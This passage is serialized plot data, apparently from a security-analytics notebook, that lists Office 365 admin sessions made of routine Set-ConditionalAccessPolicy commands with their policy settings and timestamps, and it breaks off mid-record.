(Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"NAMPRD06\\\\Administrator (Microsoft.Office.Datacenter.Torus.PowerShellWorker)\",\"timvic@contoso.onmicrosoft.com\"],\"begin\":{\"__ndarray__\":\"AADjw0std0IAAG/EVS13QgAACZydLXdCAAA2050td0IAgPEgpi13QgAAukLwLXdCAACTyPotd0IAgP3nQC53QgCA4T9BLndCAABjW0wud0IAAEsmlC53QgAAC27rLndCAABrmfYud0IAgOMbOi93QgCAJ2Q6L3dCAIAG9UIvd0IAgMLqiy93QgAAvzaWL3dCAICsgpYvd0IAgOzx3C93QgAASpzmL3dCAICc7OYvd0IAgOHgLzB3QgAAUiwwMHdCAICKbjowd0IAAK9pgTB3QgCAaiKNMHdCAIAW99Qwd0IAAC9u3jB3QgCA8KUoMXdCAIAx8TIxd0IAgJRveTF3QgCAMYKDMXdCAIDxI8wxd0IAAHFv1jF3QgCAdRwdMndCAAA93yYyd0IAAMwacDJ3QgAAL8LEMndCAACUE80yd0IAgGtxFzN3QgCAQmVqM3dCAICN3nMzd0IAAGpiuzN3QgAABpDEM3dCAABu0sQzd0IAgP07DzR3QgAA86MYNHdCAICZoWI0d0IAANlWazR3QgAAaqdrNHdCAACdG7U0d0IAAFI2vTR3QgAA6q4GNXdCAAAMnQ81d0IAAMTsVzV3QgCAwERgNXdCAICRtGA1d0IAgNlvqDV3QgCAhqmyNXdCAIBr7LI1d0IAgJp4BjZ3QgCAl7lZNndCAACt9aA2d0IAgBLgrTZ3QgAAEoXyNndCAID9Qfw2d0IAgIQrRTd3QgAALYVPN3dCAIBY4Zc3d0IAgDclmDd3QgAAyQKfN3dCAIC5eqI3d0IAgLom6zd3QgCA/GjzN3dCAAD87zw4d0IAACwjSDh3QgAA/PGPOHdCAIAeSpA4d0IAgB6RmTh3QgCA6OPgOHdCAIDAfus4d0IAgGoAMzl3QgCA2Hw+OXdCAIDhuT45d0IAgKICPzl3QgAAO0qEOXdCAIC4bIc5d0IAAINzkDl3QgCAWpmQOXdCAIAzpdg5d0IAAOap4jl3QgAAuS0sOndCAICydyw6d0IAAIcvNDp3QgCAR/99OndCAIA6V4g6d0IAgO+hiDp3QgCAKY/POndCAIBrv9o6d0IAAPCqITt3QgAAh/ohO3dCAAD6kCw7d0IAgG3tcjt3QgCA8BuAO3dCAAD6Wcc7d0IAAEtP0Tt3QgCA9MnSO3dCAAC/U9s7d0IAgL2A+Dt3QgCA9mwZPHdCAICKvyM8d0IAgBDfKDx3QgAAF3ctPHdCAIC+qFY8d0IAgF6sWDx3QgAA9KxgPHdCAADnb248d0IAgIBGbzx3QgCAFv52PHdCAIB3pr08d0IAACb/xzx3QgCACN7WPHdCAABU7g49d0IAAMlUGj13QgAAKJhjPXdCAICoUW09d0IAgAqVbT13QgCAMJ23PXdCAADVXL89d0IAgN4dBj53QgAAubYSPndCAAAe+Vs+d0IAAKkUZT53QgCARfasPndCAIBDW7g+d0IAAI1JUD93QgCAFOdaP3dCAAAAp6I/d0IAgLzNrT93QgAAkIv2P3dCAAC3w/Y/d0IAAECGAEB3QgAAyjBJQHdCAAAUMFVAd0IAgNk3wzl3Qg==\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[146]},\"color\":[\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\"],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145],\"rarest_window3\":[[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/21/2020 2:26:14 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/21/2020 2:26:14 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/21/2020 5:24:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '6/21/2020 5:24:55 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/22/2020 2:19:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/22/2020 2:19:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '6/22/2020 2:19:59 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '6/22/2020 2:19:59 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/22/2020 4:47:52 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '6/22/2020 4:47:53 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/23/2020 2:22:04 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-06-11T12:45:19.4695224Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '6/23/2020 2:22:03 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '6/23/2020 5:22:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '6/23/2020 5:22:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '6/24/2020 1:55:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': 